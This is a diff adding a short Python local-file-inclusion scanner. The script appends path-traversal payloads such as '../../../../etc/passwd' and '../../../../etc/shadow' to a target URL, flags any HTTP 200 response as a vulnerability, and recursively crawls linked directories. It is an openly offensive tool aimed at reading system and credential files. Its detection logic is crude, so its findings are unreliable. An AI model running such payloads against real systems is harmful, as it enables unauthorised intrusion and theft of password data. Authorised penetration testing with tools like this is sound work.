@@ -1,0 +1,56 @@
+import requests
+import sys
+
+# Define a list of common LFI payloads
+lfi_payloads = [
+    "../../../../etc/passwd",
+    "../../../../etc/hosts",
+    "../../../../etc/shadow",
+    "../../../../etc/group",
+    "../../../../etc/issue",
+    "../../../../etc/motd",
+]
+
+# Define a function to recursively scan directories for LFI vulnerabilities
+def scan_directory(url):
+    response = requests.get(url)
+    if response.status_code == 200:
+        print(f"[+] Directory found: {url}")
+    else:
+        print(f"[-] Directory not found: {url}")
+
+    for payload in lfi_payloads:
+        lfi_url = url + payload
+        lfi_response = requests.get(lfi_url)
+        if lfi_response.status_code == 200:
+            print(f"[+] LFI vulnerability found: {lfi_url}")
+        else:
+            print(f"[-] LFI vulnerability not found: {lfi_url}")
+
+        # Recursively scan subdirectories
+        if lfi_response.status_code == 200 and lfi_response.headers.get('content-type', '').startswith('text/html'):
+            subdirectories = extract_subdirectories(lfi_response.content)
+            for subdirectory in subdirectories:
+                subdirectory_url = url + subdirectory
+                scan_directory(subdirectory_url)
+
+# Define a function to extract subdirectories from HTML content
+def extract_subdirectories(content):
+    subdirectories = []
+    lines = content.splitlines()
+    for line in lines:
+        line = line.strip().decode(errors='ignore')
+        if line.startswith('<a href="') and line.endswith('/">'):
+            subdirectory = line[9:-3]
+            subdirectories.append(subdirectory)
+    return subdirectories
+
+if __name__ == '__main__':
+    # Check for command-line argument
+    if len(sys.argv) != 2:
+        print("Usage: python lfi_scanner.py <base_url>")
+        sys.exit(1)
+    
+    base_url = sys.argv[1]
+    # Start scanning from the base URL
+    scan_directory(base_url)
